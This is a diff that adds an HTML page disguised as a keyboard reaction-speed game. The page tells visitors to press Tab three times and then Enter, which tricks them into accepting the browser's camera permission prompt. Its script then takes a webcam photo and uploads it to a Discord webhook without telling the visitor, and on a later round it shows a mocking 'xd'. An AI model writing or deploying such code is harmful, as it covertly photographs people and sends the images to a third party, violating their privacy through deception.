@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Tab + enter</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f2f2f2;
+      color: #333;
+      padding: 40px;
+      max-width: 600px;
+      margin: auto;
+    }
+
+    h1 {
+      text-align: center;
+      color: #2c3e50;
+    }
+
+    #output {
+      margin-top: 30px;
+      font-size: 24px;
+      font-weight: bold;
+      color: #27ae60;
+      text-align: center;
+    }
+
+    #timing {
+      margin-top: 30px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    #timing h2 {
+      margin-bottom: 10px;
+      color: #34495e;
+    }
+
+    #timing ul {
+      list-style: none;
+      padding: 0;
+      font-size: 18px;
+    }
+
+    #timing ul li {
+      margin-bottom: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click 3 times: TAB TAB TAB ENTER as fast you can!</h1>
+  <div id="output"></div>
+  <div id="timing" style="display:none;">
+    <h2>Time:</h2>
+    <ul id="timeList"></ul>
+    <p><strong>average czas:</strong> <span id="averageTime"></span> sec</p>
+  </div>
+
+  <script>
+    const webhookUrl = "WEBHOOK URL HERE";
+
+    let tabCount = 0;
+    let cycleCount = 0;
+    let waitingForEnter = false;
+
+    const cycleTimestamps = [];
+    let currentStartTime = null;
+
+    document.addEventListener('keydown', async (e) => {
+      if (waitingForEnter && e.key === 'Enter') {
+        const endTime = Date.now();
+        const timeTaken = (endTime - currentStartTime) / 1000;
+        cycleTimestamps.push(timeTaken);
+
+        cycleCount++;
+        tabCount = 0;
+        waitingForEnter = false;
+
+        if (cycleCount === 1) {
+          await askCameraTakePhotoAndSend();
+        } else if (cycleCount === 3) {
+          await askForCameraAndShowXd();
+          showTimings();
+        }
+      } else if (e.key === 'Tab') {
+        e.preventDefault();
+        if (tabCount === 0) {
+          currentStartTime = Date.now();
+        }
+
+        tabCount++;
+        if (tabCount >= 3) {
+          waitingForEnter = true;
+        }
+      } else {
+        tabCount = 0;
+        waitingForEnter = false;
+      }
+    });
+
+    async function askCameraTakePhotoAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL('image/png');
+        await sendToDiscord(dataUrl);
+
+        stream.getTracks().forEach(track => track.stop());
+        document.getElementById('output').textContent = 'Nice!';
+      } catch (err) {
+        alert('Error');
+      }
+    }
+
+    async function askForCameraAndShowXd() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('output').textContent = 'xd';
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        alert('Error.');
+      }
+    }
+
+    async function sendToDiscord(dataUrl) {
+      const base64Image = dataUrl.split(',')[1];
+      const blob = base64ToBlob(base64Image, 'image/png');
+
+      const formData = new FormData();
+      formData.append('file', blob, 'photo.png');
+      formData.append('payload_json', JSON.stringify({
+        content: 'Picture from local camera.',
+      }));
+
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (!response.ok) {
+        console.error("Error!");
+      }
+    }
+
+    function base64ToBlob(base64, type = 'application/octet-stream') {
+      const binary = atob(base64);
+      const array = [];
+      for (let i = 0; i < binary.length; i++) {
+        array.push(binary.charCodeAt(i));
+      }
+      return new Blob([new Uint8Array(array)], { type: type });
+    }
+
+    function showTimings() {
+      const timeList = document.getElementById('timeList');
+      const timingBox = document.getElementById('timing');
+      const avgDisplay = document.getElementById('averageTime');
+
+      timeList.innerHTML = '';
+      let total = 0;
+
+      cycleTimestamps.forEach((time, index) => {
+        const li = document.createElement('li');
+        li.textContent = `Attempt ${index + 1}: ${time.toFixed(2)} sec`;
+        timeList.appendChild(li);
+        total += time;
+      });
+
+      const avg = total / cycleTimestamps.length;
+      avgDisplay.textContent = avg.toFixed(2);
+      timingBox.style.display = 'block';
+    }
+  </script>
+</body>
+</html>
